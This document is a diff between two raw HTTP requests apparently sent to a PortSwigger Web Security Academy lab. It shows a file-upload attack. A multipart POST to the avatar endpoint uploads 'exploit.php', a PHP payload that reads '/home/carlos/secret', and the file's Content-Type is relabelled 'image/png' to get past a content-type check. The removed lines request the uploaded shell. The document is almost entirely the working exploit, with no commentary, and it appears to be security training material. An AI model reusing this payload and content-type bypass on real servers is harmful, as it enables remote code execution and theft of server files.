@@ -1,36 +1,36 @@
-GET /files/avatars/exploit.php HTTP/1.1
-Host: ac8f1ff61f2e2defc0004790002900e3.web-security-academy.net
-Cookie: session=vjheP7mdbt0yT1YzzaL9oMocALRrc8wy
+POST /my-account/avatar HTTP/1.1
+Host: ac911f301f64c462c0341e29009700fc.web-security-academy.net
+Cookie: session=Tj8hzxOTbQrV397tZjCgYyPz9BdfmLSL
 Content-Length: 469
 Cache-Control: max-age=0
 Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
-Origin: https://ac8f1ff61f2e2defc0004790002900e3.web-security-academy.net
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryC6escdzlExl7nM3Y
+Origin: https://ac911f301f64c462c0341e29009700fc.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySKb6lkCHpYbxyc9k
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: navigate
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
-Referer: https://ac8f1ff61f2e2defc0004790002900e3.web-security-academy.net/my-account
+Referer: https://ac911f301f64c462c0341e29009700fc.web-security-academy.net/my-account
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 
-------WebKitFormBoundaryC6escdzlExl7nM3Y
+------WebKitFormBoundarySKb6lkCHpYbxyc9k
 Content-Disposition: form-data; name="avatar"; filename="exploit.php"
-Content-Type: application/x-php
+Content-Type: image/png
 
 <?php echo file_get_contents('/home/carlos/secret'); ?>
-------WebKitFormBoundaryC6escdzlExl7nM3Y
+------WebKitFormBoundarySKb6lkCHpYbxyc9k
 Content-Disposition: form-data; name="user"
 
 wiener
-------WebKitFormBoundaryC6escdzlExl7nM3Y
+------WebKitFormBoundarySKb6lkCHpYbxyc9k
 Content-Disposition: form-data; name="csrf"
 
-IT5U9dzdpPLEPJcjqQbffEFNOxRN7Rpt
-------WebKitFormBoundaryC6escdzlExl7nM3Y--
+SZ59CgZu4NZ32Qq0XNH4NLZNLXEbcHFC
+------WebKitFormBoundarySKb6lkCHpYbxyc9k--
